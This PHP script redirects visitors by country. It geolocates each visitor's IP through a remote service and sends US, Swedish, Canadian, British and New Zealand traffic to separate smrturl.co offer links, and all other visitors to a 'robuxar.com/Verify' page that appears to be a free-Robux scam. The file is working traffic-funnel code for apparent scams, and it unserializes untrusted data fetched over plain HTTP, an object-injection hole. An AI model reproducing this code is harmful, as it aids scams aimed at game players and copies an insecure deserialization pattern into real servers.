<?php
 $zbii = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$zbii;
$addrDetailsArr = unserialize(file_get_contents($geoip)); 
 $country = $addrDetailsArr['geoplugin_countryName'];

if (strcmp($country, 'United States')==0)
{
      header("location: https://smrturl.co/o/58365/53177516?s1= ");
     exit();
} 
else if (strcmp($country, 'Sweden')==0)
{
      header("location: https://smrturl.co/o/58365/53234917?s1= ");
     exit();
} 

 

else if (strcmp($country, 'Canada')==0)
{
      header("location: https://smrturl.co/o/58365/53199722?s1= ");
     exit();
} 



else if (strcmp($country, 'United Kingdom')==0)
{
      header("location: https://smrturl.co/o/58365/53245668?s1= ");
     exit();
} 





else if (strcmp($country, 'New Zealand')==0)
{
      header("location: https://smrturl.co/o/58365/53211214?s1= ");
     exit();
} 

else 
{
      header("location:  https://robuxar.com/Verify ");
     exit();
} 

?>